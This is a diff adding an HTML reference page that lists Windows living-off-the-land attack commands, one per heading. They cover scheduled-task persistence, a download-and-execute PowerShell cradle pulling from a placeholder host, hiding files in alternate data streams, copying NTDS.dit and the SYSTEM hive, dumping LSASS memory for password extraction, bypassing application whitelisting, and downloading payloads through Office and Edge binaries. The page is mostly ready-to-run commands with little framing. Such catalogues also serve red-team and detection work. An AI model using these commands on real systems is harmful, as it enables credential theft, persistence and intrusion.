+  </code></pre>
+</div>
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Create Recurring Task Every Minute</h2>
+  <p class="mt-2">Create a scheduled task that runs every minute. This can be used for persistence or to repeatedly execute commands.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr "cmd /c c:\windows\system32\calc.exe"
+  </code></pre>
+</div>
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Create Scheduled Task on Remote Computer</h2>
+  <p class="mt-2">Create a scheduled task on a remote machine to execute commands persistently.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+schtasks /create /s targetmachine /tn "MyTask" /tr "cmd /c c:\windows\system32\calc.exe" /sc daily
+  </code></pre>
+</div>
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Inject PowerShell Code into Process</h2>
+  <p class="mt-2">Inject PowerShell code into a process using a command-line argument with the SyncAppvPublishingServer tool.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('https://www.example.org/file.ps1') | IEX"
+  </code></pre>
+</div>
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Compress Files to Alternate Data Stream (ADS)</h2>
+  <p class="mt-2">Compress one or more files and store them in an Alternate Data Stream (ADS) on the target system.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+tar -cf file.ext:ads C:\Windows\Temp\folder
+  </code></pre>
+</div>
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Decompress Files from Alternate Data Stream (ADS)</h2>
+  <p class="mt-2">Decompress a file that is stored in an Alternate Data Stream (ADS) to extract its contents.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+tar -xf file.ext:ads
+  </code></pre>
+</div>
+
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Extract Archive from Remote Host</h2>
+  <p class="mt-2">Extract an archive from a remote internal host to the local system.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+tar -xf \\servername\C$\Windows\Temp\file.tar
+  </code></pre>
+</div>
+
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Extract NTDS.dit and SYSTEM Hive to Backup File</h2>
+  <p class="mt-2">Use `wbadmin` to backup NTDS.dit and the SYSTEM registry hive to a virtual hard drive file (.vhdx).</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+wbadmin start backup -backupTarget:C:\Windows\Temp\folder -include:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -quiet
+  </code></pre>
+</div>
+
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Restore NTDS.dit and SYSTEM Hive</h2>
+  <p class="mt-2">Restore a version of NTDS.dit and SYSTEM hive from a backup using `wbadmin`.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+wbadmin start recovery -version: -recoverytarget:C:\Windows\Temp\folder -itemtype:file -items:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -notRestoreAcl -quiet
+  </code></pre>
+</div>
+
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Download File Using `msedge_proxy`</h2>
+  <p class="mt-2">Use `msedge_proxy.exe` to download a malicious file from a remote server.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe https://www.example.org/file.zip
+  </code></pre>
+</div>
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Execute File in Background with `msedge_proxy`</h2>
+  <p class="mt-2">Use `msedge_proxy.exe` to execute a file in the background without user interaction.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher="cmd /c c:\windows\system32\calc.exe &&"
+  </code></pre>
+</div>
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Launch `.scr` Extension Executable via InstallScreenSaver</h2>
+  <p class="mt-2">Launch an executable with a `.scr` extension by calling the InstallScreenSaver function.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+rundll32.exe desk.cpl,InstallScreenSaver C:\Windows\Temp\file.scr
+  </code></pre>
+</div>
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Launch Remote `.scr` Executable via InstallScreenSaver</h2>
+  <p class="mt-2">Launch a remote `.scr` executable located on an SMB share using the InstallScreenSaver function.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+rundll32.exe desk.cpl,InstallScreenSaver \\servername\C$\Windows\Temp\file.scr
+  </code></pre>
+</div>
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Launch Executable Payload via Proxy (URL File)</h2>
+  <p class="mt-2">Launch an executable payload via proxy through an information URL file by calling the OpenURL function.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+rundll32.exe ieframe.dll,OpenURL C:\Windows\Temp\file.url
+  </code></pre>
+</div>
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Launch Executable Using `LaunchApplication` Function</h2>
+  <p class="mt-2">Launch an executable by calling the LaunchApplication function within `pcwutl.dll`.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+rundll32.exe pcwutl.dll,LaunchApplication file.exe
+  </code></pre>
+</div>
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Create Memory Dump of LSASS Process</h2>
+  <p class="mt-2">Create a memory dump of the LSASS process using `adplus.exe` for later analysis, such as password extraction.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+adplus.exe -hang -pn lsass.exe -o C:\Windows\Temp\folder -quiet
+  </code></pre>
+</div>
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Execute Unsigned C# Code with `csi.exe`</h2>
+  <p class="mt-2">Use `csi.exe` (C# Interactive) to execute unsigned C# code.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+csi.exe file.cs
+  </code></pre>
+</div>
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Execute Any DLL with `dotnet.exe`</h2>
+  <p class="mt-2">Execute a specified DLL file using `dotnet.exe`.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+dotnet.exe file.dll
+  </code></pre>
+</div>
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Create Memory Dump of Process Using `DumpMinitool.exe`</h2>
+  <p class="mt-2">Create a memory dump of a process by specifying its process ID using `DumpMinitool.exe`.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+DumpMinitool.exe --file C:\Windows\Temp\file.ext --processId 1132 --dumpType Full
+  </code></pre>
+</div>
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Download Payload Using `MSAccess.exe`</h2>
+  <p class="mt-2">Download a malicious payload using `MSAccess.exe` from a remote server.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+MSAccess.exe https://www.example.org/file.ext
+  </code></pre>
+</div>
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">AWL Bypass - Spawn Executable as Child Process</h2>
+  <p class="mt-2">Spawn an executable as a child process of `remote.exe` for bypassing application whitelisting (AWL).</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+Remote.exe /s file.exe anythinghere
+  </code></pre>
+</div>
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Dump Process Memory by PID Using `sqldumper.exe`</h2>
+  <p class="mt-2">Create a memory dump of a process by specifying its PID using `sqldumper.exe`.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+sqldumper.exe 464 0 0x0110
+  </code></pre>
+</div>
+
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Download Payload Using `Visio.exe`</h2>
+  <p class="mt-2">Download a payload from a remote server using `Visio.exe`.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+Visio.exe https://www.example.org/file.ext
+  </code></pre>
+</div>
+
+
+
+
+
+
+    </main>
+  </div>
+
+  <!-- Theme Script -->
+  <script>
+    function setTheme(mode) {
+      if (mode === 'system') {
+        document.documentElement.removeAttribute('data-theme');
+        localStorage.removeItem('theme');
+      } else {
+        document.documentElement.setAttribute('data-theme', mode);
+        localStorage.setItem('theme', mode);
+      }
+    }
+
+    // Load saved theme
+    const savedTheme = localStorage.getItem('theme');
+    if (savedTheme) document.documentElement.setAttribute('data-theme', savedTheme);
+  </script>
+</body>
+</html>
